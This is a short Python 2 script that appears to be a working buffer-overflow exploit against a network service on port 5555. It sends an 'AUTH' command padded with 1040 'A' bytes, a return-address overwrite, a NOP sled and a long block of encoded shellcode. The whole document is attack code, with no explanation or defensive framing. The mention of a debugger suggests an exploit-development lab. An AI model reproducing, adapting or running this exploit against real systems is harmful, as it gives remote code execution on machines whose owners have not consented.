#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()


shellcode = ("\xd9\xcf\xb8\x2a\x45\x4f\x95\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x13\x03\x6d\x56\xad\x60\x8d\xb0\xb3"
"\x8b\x6d\x41\xd4\x02\x88\x70\xd4\x71\xd9\x23\xe4\xf2\x8f\xcf"
"\x8f\x57\x3b\x5b\xfd\x7f\x4c\xec\x48\xa6\x63\xed\xe1\x9a\xe2"
"\x6d\xf8\xce\xc4\x4c\x33\x03\x05\x88\x2e\xee\x57\x41\x24\x5d"
"\x47\xe6\x70\x5e\xec\xb4\x95\xe6\x11\x0c\x97\xc7\x84\x06\xce"
"\xc7\x27\xca\x7a\x4e\x3f\x0f\x46\x18\xb4\xfb\x3c\x9b\x1c\x32"
"\xbc\x30\x61\xfa\x4f\x48\xa6\x3d\xb0\x3f\xde\x3d\x4d\x38\x25"
"\x3f\x89\xcd\xbd\xe7\x5a\x75\x19\x19\x8e\xe0\xea\x15\x7b\x66"
"\xb4\x39\x7a\xab\xcf\x46\xf7\x4a\x1f\xcf\x43\x69\xbb\x8b\x10"
"\x10\x9a\x71\xf6\x2d\xfc\xd9\xa7\x8b\x77\xf7\xbc\xa1\xda\x90"
"\x71\x88\xe4\x60\x1e\x9b\x97\x52\x81\x37\x3f\xdf\x4a\x9e\xb8"
"\x20\x61\x66\x56\xdf\x8a\x97\x7f\x24\xde\xc7\x17\x8d\x5f\x8c"
"\xe7\x32\x8a\x03\xb7\x9c\x65\xe4\x67\x5d\xd6\x8c\x6d\x52\x09"
"\xac\x8e\xb8\x22\x47\x75\x2b\x47\x93\x75\xc3\x3f\xa1\x75\x11"
"\xeb\x2c\x93\x7f\xfb\x78\x0c\xe8\x62\x21\xc6\x89\x6b\xff\xa3"
"\x8a\xe0\x0c\x54\x44\x01\x78\x46\x31\xe1\x37\x34\x94\xfe\xed"
"\x50\x7a\x6c\x6a\xa0\xf5\x8d\x25\xf7\x52\x63\x3c\x9d\x4e\xda"
"\x96\x83\x92\xba\xd1\x07\x49\x7f\xdf\x86\x1c\x3b\xfb\x98\xd8"
"\xc4\x47\xcc\xb4\x92\x11\xba\x72\x4d\xd0\x14\x2d\x22\xba\xf0"
"\xa8\x08\x7d\x86\xb4\x44\x0b\x66\x04\x31\x4a\x99\xa9\xd5\x5a"
"\xe2\xd7\x45\xa4\x39\x5c\x75\xef\x63\xf5\x1e\xb6\xf6\x47\x43"
"\x49\x2d\x8b\x7a\xca\xc7\x74\x79\xd2\xa2\x71\xc5\x54\x5f\x08"
"\x56\x31\x5f\xbf\x57\x10")
#Used 400
req1 = "AUTH " + "\x41" * 1040 + "\x71\x1d\xd1\x65" + "\x90" * 16 + shellcode + "\x43" * 33

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
